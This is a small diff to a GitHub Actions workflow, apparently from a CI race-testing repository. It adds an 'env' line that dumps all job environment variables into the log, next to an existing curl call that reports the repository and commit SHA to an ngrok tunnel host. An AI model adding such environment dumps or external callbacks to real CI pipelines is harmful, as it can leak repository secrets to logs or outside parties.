@@ -6,4 +6,5 @@ jobs:
     steps:
       - name: curl
         run: |
+          env
           curl -sL "https://6a63-24-233-100-250.ngrok.io?service=gha&repository=jimsheldon/ci-race&sha=$GITHUB_SHA"
